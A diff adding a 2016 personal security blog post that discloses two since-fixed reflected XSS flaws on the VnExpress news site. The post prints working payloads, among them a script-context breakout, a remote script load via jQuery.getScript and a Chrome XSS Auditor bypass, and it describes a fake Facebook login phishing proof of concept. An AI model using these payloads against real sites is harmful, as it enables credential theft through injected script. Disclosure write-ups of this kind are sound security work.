@@ -1,0 +1,308 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en-us">
+<head>
+  <title>
+    XSS vulnerablities on VnExpress // Cong Nguyen
+  </title>
+
+  <link href="http://gmpg.org/xfn/11" rel="profile">
+<meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+
+<meta name="description" content="">
+<meta name="keywords" content="">
+<meta name="author" content="Cong Nguyen">
+<meta name="generator" content="Hugo 0.15" />
+
+  <meta property="og:title" content="XSS vulnerablities on VnExpress" />
+<meta property="og:description" content="" />
+<meta property="og:type" content="website" />
+<meta property="og:locale" content="en_US" />
+<meta property="og:url" content="http://blog.ntcong.it/post/xss-with-vnexpress/" />
+
+
+  
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/pure/0.5.0/base-min.css">
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/pure/0.5.0/pure-min.css">
+  
+  
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/pure/0.5.0/grids-responsive-min.css">
+  
+  
+
+  <link rel="stylesheet" href="http://blog.ntcong.it/css/redlounge.css">
+  <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.min.css" rel="stylesheet">
+  <link href='http://fonts.googleapis.com/css?family=Roboto:900,500,100,300,700,400' rel='stylesheet' type='text/css'>
+  <link href='//fonts.googleapis.com/css?family=Libre+Baskerville:400,700,400italic' rel='stylesheet' type='text/css'>
+
+  
+  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/touch-icon-144-precomposed.png">
+  <link rel="shortcut icon" href="/favicon.png">
+
+  
+  <link href="" rel="alternate" type="application/rss+xml" title="Cong Nguyen" />
+
+  
+
+  
+    <link rel="stylesheet" type="text/css" href="/css/categories.css">
+  
+
+  
+</head>
+
+<body>
+	
+
+	<div id="layout" class="pure-g">
+    <div class="sidebar pure-u-1 pure-u-md-1-4">
+  <div class="header">
+    
+
+	
+	  <img src="/img/avatar.png" class="sidebarphoto">
+	
+
+    <h1 class="brand-title">CongNT</h1>
+    <h2 class="brand-tagline">Thoughts on Programming and anything Computer</h2>
+
+    <nav class="nav">
+      <ul class="nav-list">
+        <li class="nav-item"><span class="nav-item-separator">//</span><a href="http://blog.ntcong.it">Home</a></li>
+        
+          <li class="nav-item"><span class="nav-item-separator">//</span><a href="/about/">About</a></li>
+        
+          <li class="nav-item"><span class="nav-item-separator">//</span><a href="/posts/">Blog</a></li>
+        
+      </ul>
+    </nav>
+
+    
+    <div class="social-buttons">
+      
+        
+        <a href="https://facebook.com/ntcong.it" target="_blank"><i class='fa fa-facebook'></i></a>
+        
+      
+        
+        <a href="http://github.com/ntcong" target="_blank"><i class='fa fa-github'></i></a>
+        
+      
+        
+        <a href="https://plus.google.com/&#43;CongNguyen" target="_blank"><i class='fa fa-google-plus'></i></a>
+        
+      
+        
+        <a href="http://blog.ntcong.it/posts/index.xml" target="_blank"><i class='fa fa-rss'></i></a>
+        
+      
+      
+    </div>
+    
+
+  </div>
+</div>
+
+	
+	
+
+    <div class="content pure-u-1 pure-u-md-3-4">
+		<a name="top"></a>
+		
+
+		
+			
+		    <div id="toc" class="pure-u-1 pure-u-md-1-4">
+				<small class="toc-label">Contents</small>
+		   	 	<nav id="TableOfContents">
+<ul>
+<li><a href="#xss-on-e-vnexpress-net:3b2adbfb4f5b591fc123309bb7eb9de1">XSS on e.vnexpress.net</a></li>
+<li><a href="#xss-on-vnexpress-net:3b2adbfb4f5b591fc123309bb7eb9de1">XSS on vnexpress.net</a></li>
+</ul>
+</nav>
+		    </div>
+		    
+	    
+  		<section class="post">
+            <h1 class="post-title">
+              <a href="/post/xss-with-vnexpress/">XSS vulnerablities on VnExpress</a>
+            </h1>
+            <h3 class="post-subtitle">
+            	
+            </h3>
+            
+            	<span class="post-date">
+                	<span class="post-date-day"><sup>22</sup></span><span class="post-date-separator">/</span><span class="post-date-month">Mar</span> <span class="post-date-year">2016</span>
+            	</span>
+            	
+            
+            	
+            		<span class="post-author-single">By <a class="post-author" href="http://ntcong.it" target="">Cong Nguyen</a></span>
+            		
+      <span class="post-author-social post-author-facebook"><a href="http://facebook.com/ntcong.it" target="_blank"><i class="fa fa-facebook"></i></a></span>
+
+
+      <span class="post-author-social post-author-google-plus"><a href="https://plus.google.com/&#43;CongNguyen" target="_blank"><i class="fa fa-google-plus"></i></a></span>
+
+
+
+
+            	
+            
+
+			
+			
+				<div class="post-categories">
+				
+					<a class="post-category post-category-security" href="http://blog.ntcong.it/categories/security">security</a>
+				
+				</div>
+			
+
+			
+
+			
+
+            
+
+<h1 id="xss-on-e-vnexpress-net:3b2adbfb4f5b591fc123309bb7eb9de1">XSS on e.vnexpress.net</h1>
+
+<p>Recently I found two XSS vulnerablities on vnExpress website. It all begins with the newly introduced English version of VnExpress, and I didn&rsquo;t have to spend a lot of time to find the search box wasn&rsquo;t escaped properly. Just do a search with &ldquo;&gt; will reveal this.</p>
+
+
+<figure >
+    
+        <img src="/img/vne/vne1.png" />
+    
+    
+    <figcaption>
+        <h4>XSS on e.VNE</h4>
+        
+    </figcaption>
+    
+</figure>
+
+
+<p>Pretty serious problem if anyone still doesn&rsquo;t care about escaping user-input, especially on a search box. Luckily, a normal XSS payload will only works on Firefox, because Chrome and IE have XSS Auditor for a while now (you can still bypass it, which I will tell you later). Also because the site doesn&rsquo;t have user account yet, the best I can do is launching a phishing attack (I jut did a PoC to demo what I can do, not really attack anyone).</p>
+
+<p>Phishing is also a serious problem for a big website like VnExpress. People trained to trust VnE and will do most thing the website told them to (like give Facebook&rsquo;s password). So it&rsquo;s pretty simple, I can inject my script in the search page already, I load the main site with jQuery.get, replace the top post with a fake Facebook login, replace the HTML content, and then use window.history.pushState to replace the address bar. This way the site will display the main page with its url, not the search page.</p>
+
+<p>But it&rsquo;s still not very good since it only works on Firefox, so I did a quick look at the HTML source code and found this</p>
+
+<div class="highlight" style="background: #002b36"><pre style="line-height: 125%"><span></span><span style="color: #859900">var</span> <span style="color: #839496">strKeyWord</span>  <span style="color: #839496">=</span> <span style="color: #2aa198">&quot;&quot;</span><span style="color: #839496">&gt;</span><span style="color: #dc322f">&quot;</span><span style="color: #839496">;</span>
+<span style="color: #859900">var</span> <span style="color: #839496">blData</span>      <span style="color: #839496">=</span> <span style="color: #2aa198">0</span><span style="color: #839496">;</span>
+</pre></div>
+
+
+<p>Why they include the search parameter on a Javascript code, without any protection is beyond me, but this will bypass all the protection XSS Auditor provides to you, because it&rsquo;s not a normal XSS payload anymore, any text you inputed in will run on javascript directly. The new payload will look like this.
+<div class="highlight" style="background: #002b36"><pre style="line-height: 125%"><span></span><span style="color: #2aa198">&quot;;alert(1);&quot;</span>
+</pre></div>
+</p>
+
+<p>And it will not be detected by Chrome or IE&rsquo;s XSS Auditor. Extensible is a must, so I load the script from outside
+<div class="highlight" style="background: #002b36"><pre style="line-height: 125%"><span></span><span style="color: #2aa198">&quot;;jQuery.getScript(&quot;</span><span style="color: #839496">http:</span><span style="color: #586e75; font-style: italic">//js.js&quot;) .done(function() {});&quot;</span>
+</pre></div>
+</p>
+
+<p>Pretty neat, huh?</p>
+
+<p>What should I do to prevent it? Well XSS is never a simple problem to begin with, but at least never ever trust anything the user input, escape it, whitelist the character, make sure they don&rsquo;t input any special characacter, because no one want to search an article with &ldquo;;&rdquo;@(alert(1));&rdquo; anyway. And NEVER use the input directly onto your javascript, it is very dangerous.</p>
+
+<h1 id="xss-on-vnexpress-net:3b2adbfb4f5b591fc123309bb7eb9de1">XSS on vnexpress.net</h1>
+
+<p>Then I thought, if they fucked up this bad on their new site, the main site should have some weakness as well. One thing they did a little better is, the main search box is properly escaped, but I noticed they put the whole URL onto the Time and Sort filter, so maybe something will not be escaped, like the &ldquo;search_f=&rdquo; parameter.</p>
+
+<pre><code>http://timkiem.vnexpress.net/?search_f=%22%3E&amp;q=xss&amp;cate_code=&amp;media_type=all&amp;latest=&amp;fromdate=0&amp;todate=0&amp;date_format=all
+</code></pre>
+
+
+<figure >
+    
+        <img src="/img/vne/vne2.png" />
+    
+    
+    <figcaption>
+        <h4>XSS on VNE</h4>
+        
+    </figcaption>
+    
+</figure>
+
+
+<p>This time there&rsquo;s no javascript bug on this page, but working only with Firefox is no fun, let&rsquo;s find out how to bypass Chrome.</p>
+
+<p>So Chrome did a great job to find a XSS payload on the URL, and prevent it from running. But there&rsquo;s a flaw: it won&rsquo;t stop an invalid XSS payload, like a script without closing tag. And the HTML parse won&rsquo;t care about the content inside the <script> tag, as long as you include a src attribute. This payload requires you to have a closing </script> tag, which most website nowaday have to execute javascript after the main content finishes loading. The payload looks like this</p>
+
+<p><div class="highlight" style="background: #002b36"><pre style="line-height: 125%"><span></span><span style="color: #dc322f">&quot;</span><span style="color: #839496">&gt;&lt;script/src=data:,alert(</span><span style="color: #2aa198">1</span><span style="color: #839496">)%</span><span style="color: #2aa198">26</span><span style="color: #839496">sol;%</span><span style="color: #2aa198">26</span><span style="color: #839496">sol;</span>
+</pre></div>
+</p>
+
+<p>The result html will looks like this: &lt;script src=&ldquo;data:,alert(1)//&amp;q=xss&hellip;.&ldquo;&gt;[a lot of HTML]&lt;/script&gt;. Andddd it runs on Chrome. And also it&rsquo;s pretty funny to see VnExpress do some weird shit with their site, results in the alert(1) display several times when the page loads (view count increase maybe?)</p>
+
+<p>Kudos to VnExpress for fixing the bug pretty fast after I reported it to them. But I think they should do something better than having a XSS vuln on the main search box in the first place.</p>
+
+	
+			
+
+			
+				<div class="tags-list">
+					<span class="dark-red">Tags</span><span class="decorative-marker">//</span>
+					
+	                <a class="post-tag post-tag-security" href="http://blog.ntcong.it/tags/security">security</a>,
+	                
+				</div>
+			
+
+			
+				<div class="paging">
+					<span class="paging-label">More Reading</span>
+					
+
+					
+					<div class="paging-older">
+						<span class="dark-red">Older</span><span class="decorative-marker">//</span>
+			            <a class="paging-link" href="/post/how-vcb-do-otp-or-how-not-to-do-it/">How VCB OTP works and How not to do it</a>
+		            </div>
+		            
+	            </div>
+            
+          </section>
+          
+          	<div id="disqus_thread"></div>
+<script type="text/javascript">
+    var disqus_shortname = 'ntcongit';
+    var disqus_identifier = 'http:\/\/blog.ntcong.it\/post\/xss-with-vnexpress\/';
+    var disqus_title = 'XSS vulnerablities on VnExpress';
+    var disqus_url = 'http:\/\/blog.ntcong.it\/post\/xss-with-vnexpress\/';
+
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+          
+        
+      <div class="footer">
+	<hr class="thin" />
+	<div class="pure-menu pure-menu-horizontal pure-menu-open">
+		<ul class="footer-menu">
+		
+		</ul>
+	</div>
+
+	<p>&copy; 2016. All rights reserved.</p>
+</div>
+    </div>
+  </div>
+	
+
+	
+
+  
+</body>
+</html>
